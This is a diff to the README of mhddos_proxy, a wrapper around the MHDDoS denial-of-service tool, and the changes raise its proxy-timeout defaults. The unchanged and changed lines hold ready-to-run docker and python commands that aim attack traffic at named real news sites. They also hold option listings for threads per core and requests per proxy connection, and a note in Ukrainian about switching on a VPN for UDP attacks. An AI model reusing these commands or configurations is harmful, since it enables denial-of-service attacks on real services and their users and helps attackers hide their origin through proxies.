@@ -70,7 +70,7 @@ UDP - **ТУТ ПОТРІБНО ВКЛЮЧИТИ VPN**
 
 Отримати більше проксі (можливо, гіршої якості) - `--proxy-timeout SECONDS`
 
-    docker run -it --rm portholeascend/mhddos_proxy --proxy-timeout 3 https://ria.ru https://tass.ru
+    docker run -it --rm portholeascend/mhddos_proxy --proxy-timeout 5 https://ria.ru https://tass.ru
 
 Змінити частоту оновлення проксі (за замовчуванням - кожні 5 хвилин) - `-p SECONDS`
 
@@ -108,9 +108,9 @@ UDP - **ТУТ ПОТРІБНО ВКЛЮЧИТИ VPN**
       -h, --help             show this help message and exit
       -t, --threads 300      Threads per CPU core (default is 300)
       -p, --period 300       How often to update the proxies (default is 300)
-      --proxy-timeout 1      How many seconds to wait for the proxy to make a connection.
+      --proxy-timeout 2      How many seconds to wait for the proxy to make a connection.
                              Higher values give more proxies, but with lower speed/quality.
-                             Parsing also takes more time (default is 1)
+                             Parsing also takes more time (default is 2)
 
       --debug                Enable debug output from MHDDoS
       --rpc 1000             How many requests to send on a single proxy connection (default is 1000)
@@ -177,9 +177,9 @@ Wrapper script for running [MHDDoS](https://github.com/MHProDev/MHDDoS)
       -h, --help             show this help message and exit
       -t, --threads 300      Threads per CPU Core (default is 300)
       -p, --period 300       How often to update the proxies (default is 300)
-      --proxy-timeout 1      How many seconds to wait for the proxy to make a connection.
+      --proxy-timeout 2      How many seconds to wait for the proxy to make a connection.
                              Higher values give more proxies, but with lower speed/quality.
-                             Parsing also takes more time (default is 1)
+                             Parsing also takes more time (default is 2)
 
       --debug                Enable debug output from MHDDoS
       --rpc 1000             How many requests to send on a single proxy connection (default is 1000)
@@ -225,7 +225,7 @@ Change proxy update interval
 
 Get more proxies (possibly lower quality)
 
-    python3 runner.py --proxy-timeout 3 https://tvzvezda.ru
+    python3 runner.py --proxy-timeout 5 https://tvzvezda.ru
 
 Specific HTTP(S) attack method(s)
 
